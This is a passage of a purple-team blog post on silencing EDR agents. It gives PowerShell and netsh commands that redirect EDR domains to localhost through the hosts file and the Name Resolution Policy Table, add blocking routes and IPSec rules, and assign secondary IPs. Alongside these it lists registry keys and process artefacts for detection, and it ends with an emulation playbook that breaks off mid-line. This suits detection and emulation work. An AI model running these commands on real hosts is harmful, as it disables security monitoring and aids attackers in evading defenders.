<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_495556" class="syntaxhighlighter  powershell"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="powershell functions">Add-Content</code> <code class="powershell color1">-Path</code> <code class="powershell string">"C:\Windows\System32\drivers\etc\hosts"</code> <code class="powershell color1">-Value</code> <code class="powershell string">"127.0.0.1 edr.domain.com"</code></div><div class="line number2 index1 alt1"><code class="powershell functions">Add-Content</code> <code class="powershell color1">-Path</code> <code class="powershell string">"C:\Windows\System32\drivers\etc\hosts.ics"</code> <code class="powershell color1">-Value</code> <code class="powershell string">"127.0.0.1 edr.domain.com"</code></div></div></td></tr></tbody></table></div></div></div>


<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1648" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-hosts-file/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file.png" data-orig-size="957,214" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Hosts File" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file.png?w=957" loading="lazy" width="957" height="214" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file.png?w=957" alt="" class="wp-image-1648"><figcaption class="wp-element-caption"><em>Hosts File Modification</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1650" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-hosts-files/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-files.png" data-orig-size="1530,688" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Hosts Files" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-files.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-files.png?w=1024" loading="lazy" width="1024" height="460" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-files.png?w=1024" alt="" class="wp-image-1650"><figcaption class="wp-element-caption"><em>Hosts File</em></figcaption></figure>



<h3 class="wp-block-heading">Routing Table</h3>



<p class="has-text-align-justify wp-block-paragraph">Windows Operating Systems maintain the routing table to determine how IP packets should be forwarded across networks. Threat actors could add custom routes to the routing table to prevent the agent contacting EDR IP addresses.</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_659642" class="syntaxhighlighter  powershell"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="powershell functions">Get-NetIPInterface</code></div><div class="line number2 index1 alt1"><code class="powershell functions">New-NetRoute</code> <code class="powershell color1">-DestinationPrefix</code> <code class="powershell string">"192.168.100.0/32"</code> <code class="powershell color1">-InterfaceIndex</code> <code class="powershell plain">1</code> <code class="powershell color1">-PolicyStore</code> <code class="powershell plain">ActiveStore</code></div></div></td></tr></tbody></table></div></div></div>


<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1655" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-add-route/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-route.png" data-orig-size="958,439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Add Route" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-route.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-route.png?w=958" loading="lazy" width="958" height="439" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-route.png?w=958" alt="" class="wp-image-1655"><figcaption class="wp-element-caption"><em>Add Route</em></figcaption></figure>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1657" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-routing-table/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-routing-table.png" data-orig-size="960,484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Routing Table" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-routing-table.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-routing-table.png?w=960" loading="lazy" width="960" height="484" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-routing-table.png?w=960" alt="" class="wp-image-1657"><figcaption class="wp-element-caption"><em>Routing Table</em></figcaption></figure>



<h3 class="wp-block-heading">Name Resolution Policy Table</h3>



<p class="has-text-align-justify wp-block-paragraph">The Name Resolution Policy Table (NRPT) is a configuration component part of the Windows operating system that is used to control how specific domain names are resolved. Specifically, the table determines which DNS servers should be used for specific domains and whether a name should be resolved using internal or external infrastructure. It is important to note that the DNS client on Windows will always check the table and if a record doesn’t exist the default DNS server will be used. </p>



<p class="has-text-align-justify wp-block-paragraph">For assets that are protected by Windows Defender for Endpoint, Microsoft has released in public a full <a href="https://download.microsoft.com/download/mde-streamlined-urls-commercial.xlsx">list</a> of domain names and URL’s that are required by the EDR. Threat actors who have already compromised a network with Windows Defender for Endpoint deployed, could add entries to the Name Resolution Policy Table that will redirect all DNS queries associated with Defender for Endpoint to localhost. A similar approach could be conducted for other EDR’s. The <em>Add-DnsClientNrptRule</em> PowerShell cmdlet can be used to add records: </p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_172420" class="syntaxhighlighter  powershell"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="powershell functions">Add-DnsClientNrptRule</code> <code class="powershell color1">-Namespace</code> <code class="powershell string">".endpoint.security.microsoft.com"</code> <code class="powershell color1">-NameServers</code> <code class="powershell plain">127.0.0.1</code> <code class="powershell color1">-Comment</code> <code class="powershell string">"Silenced by Name Resolution Policy Table"</code></div><div class="line number2 index1 alt1"><code class="powershell functions">Add-DnsClientNrptRule</code> <code class="powershell color1">-Namespace</code> <code class="powershell string">"endpoint.security.microsoft.com"</code> <code class="powershell color1">-NameServers</code> <code class="powershell plain">127.0.0.1</code> <code class="powershell color1">-Comment</code> <code class="powershell string">"Silenced by Name Resolution Policy Table"</code></div><div class="line number3 index2 alt2"><code class="powershell functions">Clear-DnsClientCache</code></div></div></td></tr></tbody></table></div></div></div>


<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1660" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-name-resolution-policy-table/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table.png" data-orig-size="973,508" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Name Resolution Policy Table" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table.png?w=973" loading="lazy" width="973" height="508" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table.png?w=973" alt="" class="wp-image-1660"><figcaption class="wp-element-caption"><em>Name Resolution Policy Table</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Name Resolution Policy Table rules are stored in the following registry location: </p>



<pre class="wp-block-code"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DnsPolicyConfig</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1663" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-name-resolution-policy-table-rules/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-rules.png" data-orig-size="939,397" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Name Resolution Policy Table Rules" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-rules.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-rules.png?w=939" loading="lazy" width="939" height="397" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-rules.png?w=939" alt="" class="wp-image-1663"><figcaption class="wp-element-caption"><em>Name Resolution Policy Table Rules</em></figcaption></figure>



<h3 class="wp-block-heading">IPSec Filter Rules</h3>



<p class="has-text-align-justify wp-block-paragraph">The purpose of IPSec Filter Rules is to encrypt or authenticate traffic. IPSec operates at the network layer, where traffic is wrapped in an ESP (Encapsulating Security Payload) header. IPSec Filter Rules, determine how traffic should be handled and effectively serve as the logic engine for encryption decisions. There are three possible outcomes for a packet:</p>



<ol class="wp-block-list">
<li>Permit – Traffic Pass-Through without Encryption</li>



<li>Block – Traffic is Prevented</li>



<li>Negotiate Security – Packets are Protected</li>
</ol>



<p class="has-text-align-justify wp-block-paragraph">IPSec Filter Rules can be used to block Endpoint Detection and Response communication even if IPSec is not configured on the endpoint. </p>



<pre class="wp-block-code"><code>netsh ipsec static add policy name=ipurplePolicy description=ipurplePolicy
netsh ipsec static set policy name=ipurplePolicy assign=y
netsh ipsec static add filteraction name=BlockFilterAction action=block
netsh ipsec static add rule name=BlockRule policy=ipurplePolicy filterlist=BlockFilterList filteraction=BlockFilterAction description="IPSec Block Rule"</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1667" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-add-ipsec-filter-rules/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-ipsec-filter-rules.png" data-orig-size="960,441" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Add IPSec Filter Rules" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-ipsec-filter-rules.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-ipsec-filter-rules.png?w=960" loading="lazy" width="960" height="441" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-add-ipsec-filter-rules.png?w=960" alt="" class="wp-image-1667"><figcaption class="wp-element-caption"><em>Add IPSec Filter Rules</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Execution of the command below will confirm that the new policy has been created: </p>



<pre class="wp-block-code"><code>netsh ipsec static show all</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1668" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-filter-rules/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filter-rules.png" data-orig-size="922,505" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Filter Rules" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filter-rules.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filter-rules.png?w=922" loading="lazy" width="922" height="505" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filter-rules.png?w=922" alt="" class="wp-image-1668"><figcaption class="wp-element-caption"><em>IPSec Filter Rules</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Local IPSec policy configurations are stored in the registry. The values of IP addresses are not human readable and are stored in hexadecimal format.</p>



<pre class="wp-block-code"><code>HKLM\Software\Policies\Microsoft\Windows\IPSec\Policy\Local\ipsecFilter{GUID}\ipsecData</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1671" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipsec-policy-registry-key/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-registry-key.png" data-orig-size="1201,919" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPSec Policy Registry Key" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-registry-key.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-registry-key.png?w=1024" loading="lazy" width="1024" height="783" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-registry-key.png?w=1024" alt="" class="wp-image-1671"><figcaption class="wp-element-caption"><em>IPSec Policy Registry Key</em></figcaption></figure>



<h3 class="wp-block-heading">Secondary IP Addresses</h3>



<p class="has-text-align-justify wp-block-paragraph">A lightweight method to cause EDR communication disruption is to assign the network interface multiple IP addresses that belong to the EDR. If the interface on the asset has a foreign public IP address assigned to it, the routing table will not forward packets to the Internet and instead will deliver them locally. The connection will fail because no application will listen on that IP address. <a href="https://x.com/iliyadafchev">Iliya Dafchev</a> released a PowerShell script that could monitor a specific set of EDR processes for TCP connections, capture the remote address of each connection and assign the remote address as a secondary IP address on all physical interfaces. </p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1675" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-ipmute/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipmute.png" data-orig-size="921,451" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; IPMute" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipmute.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipmute.png?w=921" loading="lazy" width="921" height="451" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipmute.png?w=921" alt="" class="wp-image-1675"><figcaption class="wp-element-caption"><em>IP Mute</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Upon execution of the IP Mute, the host IP configuration will change from automatic to static.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1677" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-static-ip-address/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-static-ip-address.png" data-orig-size="766,468" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Static IP Address" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-static-ip-address.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-static-ip-address.png?w=766" loading="lazy" width="766" height="468" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-static-ip-address.png?w=766" alt="" class="wp-image-1677"><figcaption class="wp-element-caption"><em>Static IP Address</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The secondary IP addresses field will be populated with the IP addresses that the IP Mute PowerShell script monitors.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1680" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-secondary-ip-addresses/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-secondary-ip-addresses.png" data-orig-size="387,484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Secondary IP Addresses" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-secondary-ip-addresses.png?w=240" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-secondary-ip-addresses.png?w=387" loading="lazy" width="387" height="484" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-secondary-ip-addresses.png?w=387" alt="" class="wp-image-1680"><figcaption class="wp-element-caption"><em>Secondary IP Addresses</em></figcaption></figure>



<p class="wp-block-paragraph">It should be noted that the following registry key stores information related to static IP addresses. </p>



<pre class="wp-block-code"><code>HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\IPAddress</code></pre>



<p class="has-text-align-justify wp-block-paragraph">Depending on how the IP addresses are added different processes are observed in the operating system. The table below shows the list of processes associated with the behavior. </p>



<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th class="has-text-align-center" data-align="center">Process</th><th class="has-text-align-center" data-align="center">Behaviour</th></tr></thead><tbody><tr><td class="has-text-align-center" data-align="center">wmiprvse.exe</td><td class="has-text-align-center" data-align="center">Modification via PowerShell cmdlet</td></tr><tr><td class="has-text-align-center" data-align="center">DllHost.exe</td><td class="has-text-align-center" data-align="center">Modification via Graphical User Interface</td></tr><tr><td class="has-text-align-center" data-align="center">netsh.exe</td><td class="has-text-align-center" data-align="center">Modification via netsh utility</td></tr><tr><td class="has-text-align-center" data-align="center">svchost.exe</td><td class="has-text-align-center" data-align="center">DHCP Assigned</td></tr></tbody></table></figure>



<p class="has-text-align-justify wp-block-paragraph">The playbook to emulate the technique of EDR Silencing can be found below:</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_946351" class="syntaxhighlighter  yaml"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number2 index1 alt1"><code class="yaml plain">id = </code><code class="yaml string">"1.0.0"</code></div><div class="line number3 index2 alt2"><code class="yaml plain">name = </code><code class="yaml string">"1.0.0 - EDR Silencing"</code></div><div class="line number4 index3 alt1"><code class="yaml plain">description = </code><code class="yaml string">"EDR agent communucation disruption via Windows Filtering Platform"</code></div><div class="line number5 index4 alt2"><code class="yaml plain">tooling.name = </code><code class="yaml string">"EDRSilencer"</code></div><div class="line number6 index5 alt1"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number7 index6 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"<a href="https://github.com/netero1010/EDRSilencer/">https://github.com/netero1010/EDRSilencer/</a>"</code></div><div class="line number8 index7 alt1"><code class="yaml constants">]</code></div><div class="line number9 index8 alt2"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number10 index9 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"shell EDRSilencer.exe blockedr"</code></div><div class="line number11 index10 alt2"><code class="yaml constants">]</code></div><div class="line number12 index11 alt1"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number13 index12 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number14 index13 alt1"><code class="yaml constants">]</code></div><div class="line number15 index14 alt2">&nbsp;</div><div class="line number16 index15 alt1"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number17 index16 alt2"><code class="yaml plain">id = </code><code class="yaml string">"1.1.0"</code></div><div class="line number18 index17 alt1"><code class="yaml plain">name = </code><code class="yaml string">"1.1.0 - EDR Silencing"</code></div><div class="line number19 index18 alt2"><code class="yaml plain">description = </code><code class="yaml string">"EDR agent communucation disruption via Name Resolution Policy Table"</code></div><div class="line number20 index19 alt1"><code class="yaml plain">tooling.name = </code><code class="yaml string">"N/A"</code></div><div class="line number21 index20 alt2"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number22 index21 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"N/A"</code></div><div class="line number23 index22 alt2"><code class="yaml constants">]</code></div><div class="line number24 index23 alt1"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number25 index24 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml 